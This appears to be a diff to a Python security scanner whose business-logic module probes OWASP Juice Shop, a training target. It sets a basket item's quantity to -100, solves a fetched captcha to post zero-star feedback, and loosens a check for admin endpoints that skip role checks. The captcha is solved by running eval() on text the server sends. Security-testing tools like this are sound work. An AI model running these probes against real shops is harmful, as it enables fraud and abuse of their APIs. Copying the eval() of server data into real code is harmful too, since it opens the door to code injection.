@@ -208,9 +208,27 @@ class BizLogicWorker(BaseWorker):
         origin: str,
         headers: Dict[str, str],
     ) -> Optional[Dict[str, Any]]:
-        """Try to add item with negative quantity to basket."""
-        for basket_item_id in range(1, 10):
-            url = f"{origin}/api/BasketItems/{basket_item_id}"
+        """Add an item to the authenticated user's basket, then try negative quantity."""
+        basket_item_id = None
+        # Step 1: find user's basket ID from whoami or try basket IDs 1-5
+        for prod_id in (1, 2, 3):
+            try:
+                r = await client.post(
+                    f"{origin}/api/BasketItems",
+                    json={"ProductId": prod_id, "BasketId": 1, "quantity": 1},
+                    headers=headers,
+                )
+                if r.status_code in (200, 201):
+                    basket_item_id = r.json().get("data", {}).get("id")
+                    break
+            except Exception:
+                pass
+
+        candidates = [basket_item_id] if basket_item_id else list(range(1, 10))
+        for bid in candidates:
+            if bid is None:
+                continue
+            url = f"{origin}/api/BasketItems/{bid}"
             try:
                 resp = await client.put(url, json={"quantity": -100}, headers=headers)
                 if resp.status_code in (200, 201, 204):
@@ -233,15 +251,32 @@ class BizLogicWorker(BaseWorker):
     ) -> Optional[Dict[str, Any]]:
         """Submit feedback with rating=0 (below UI minimum of 1)."""
         url = f"{origin}/api/Feedbacks"
+        # Step 1: fetch a valid captcha challenge
+        captcha_id, captcha_answer = 0, ""
+        try:
+            cr = await client.get(f"{origin}/api/Captchas", headers=headers)
+            if cr.status_code == 200:
+                captchas = cr.json().get("data", [])
+                if captchas:
+                    c = captchas[-1]
+                    captcha_id = c.get("id", 0)
+                    # Juice Shop captchas are simple math expressions
+                    try:
+                        captcha_answer = str(int(eval(c.get("answer", "0"))))  # noqa: S307
+                    except Exception:
+                        captcha_answer = str(c.get("answer", ""))
+        except Exception as e:
+            logger.debug(f"[bizlogic] Zero stars captcha fetch: {e}")
+
         try:
             resp = await client.post(
                 url,
                 json={"comment": "briar-bizlogic-probe", "rating": 0,
-                      "captchaId": 0, "captcha": ""},
+                      "captchaId": captcha_id, "captcha": captcha_answer},
                 headers=headers,
             )
             if resp.status_code in (200, 201):
-                logger.info(f"[bizlogic] Zero-star feedback accepted")
+                logger.info("[bizlogic] Zero-star feedback accepted")
                 return _finding(
                     url, "zero_stars", SeverityLevel.low,
                     "Business logic flaw: zero-star feedback accepted (bypasses client-side minimum)",
@@ -591,7 +626,7 @@ class BizLogicWorker(BaseWorker):
                     try:
                         data = resp.json()
                         items = data.get("data", [])
-                        if isinstance(items, list) and len(items) > 1:
+                        if isinstance(items, list) and len(items) >= 1:
                             logger.info(
                                 f"[bizlogic/admin] {path} returned {len(items)} items "
                                 "without admin role check"
